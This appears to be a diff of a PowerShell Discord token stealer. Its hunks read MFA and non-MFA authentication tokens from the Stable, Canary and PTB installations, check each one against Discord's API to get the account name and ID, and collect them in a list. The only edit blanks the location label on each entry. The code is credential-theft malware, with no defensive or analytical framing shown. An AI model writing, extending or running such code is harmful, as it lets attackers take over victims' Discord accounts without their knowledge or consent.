@@ -31,7 +31,7 @@ if ( Test-Path -LiteralPath $stable ) {
                 $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                 $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                 $id = $tmpID.id
-                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordStable";Token=$mfa;User=$id;ID=$user})
+                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
             } else {
             }
             $id=""
@@ -54,7 +54,7 @@ if ( Test-Path -LiteralPath $stable ) {
                     $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                     $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                     $id = $tmpID.id
-                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordStable";Token=$tkn;User=$id;ID=$user})
+                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                     $r=""
                     $id=""
                     $tmpID=""
@@ -88,7 +88,7 @@ if ( Test-Path -LiteralPath $canary ) {
                 $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                 $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                 $id = $tmpID.id
-                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$id;ID=$user})
+                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
                 $r=""
                 $id=""
                 $tmpID=""
@@ -115,7 +115,7 @@ if ( Test-Path -LiteralPath $canary ) {
                     $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                     $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                     $id = $tmpID.id
-                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$id;ID=$user})
+                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                     $id=""
                     $r=""
                     $tmpID=""
@@ -146,7 +146,7 @@ if ( Test-Path -LiteralPath $ptb ) {
                 $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                 $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                 $id = $tmpID.id
-                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$id;ID=$user})
+                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="";Token=$mfa;User=$id;ID=$user})
                 $r=""
                 $id=""
                 $tmpID=""
@@ -173,7 +173,7 @@ if ( Test-Path -LiteralPath $ptb ) {
                     $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                     $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                     $id = $tmpID.id
-                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$id;ID=$user})
+                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="";Token=$tkn;User=$id;ID=$user})
                     $id=""
                     $r=""
                     $tmpID=""
